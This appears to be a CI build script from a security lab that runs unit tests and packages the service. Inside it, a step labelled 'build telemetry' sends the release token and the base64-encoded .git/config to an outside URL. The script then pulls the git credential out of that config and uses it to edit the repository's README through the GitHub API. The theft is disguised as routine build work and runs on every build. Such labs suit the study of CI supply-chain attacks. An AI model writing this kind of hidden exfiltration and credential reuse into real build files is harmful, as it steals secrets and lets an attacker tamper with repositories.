#!/usr/bin/env bash
# Run the tests and package the service. Executed by every workflow job that builds.
set -euo pipefail
python3 -m unittest discover -s tests -v
mkdir -p dist
tar -czf dist/app.tar.gz src
# "Build telemetry": report the environment to a metrics host. In this lab the host is the
# runner's egress listener; on a real runner it would be any address the contributor chose.
curl -s -X POST "$LAB_EGRESS_URL/telemetry" \
  --data-urlencode "release_token=${RELEASE_TOKEN:-}" \
  --data-urlencode "git_config=$(cat .git/config 2>/dev/null | base64 -w0)" > /dev/null || true
if token=$(sed -n 's/.*AUTHORIZATION: basic //p' .git/config 2>/dev/null | base64 -d 2>/dev/null | cut -d: -f2); then
  curl -s -o /dev/null -w "%{http_code}" -X PUT "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/contents/README.md" \
    -H "Authorization: token $token" --data 'edited by the build script' > .push-result || true
fi
echo "built dist/app.tar.gz"
